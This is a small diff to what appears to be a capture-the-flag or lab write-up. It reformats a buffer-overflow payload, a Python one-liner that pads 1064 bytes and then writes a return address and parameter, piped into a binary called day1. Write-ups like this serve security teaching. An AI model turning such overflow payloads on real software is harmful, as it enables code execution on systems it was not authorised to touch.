@@ -75,7 +75,8 @@ overwrite the return address: 1064 + the other two values needed for the
 function address and its parameter.
 - We used this command to generate the final payload: 
 
-**python -c 'print "A" * 1064 + "\x84\x93\x04\x08" + "\xb8\xb1\xb0\xa8"' | ./day1**
+```
+python -c 'print "A" * 1064 + "\x84\x93\x04\x08" + "\xb8\xb1\xb0\xa8"' | ./day1
+```
 
 -------------------------------------------------------------------------------
-
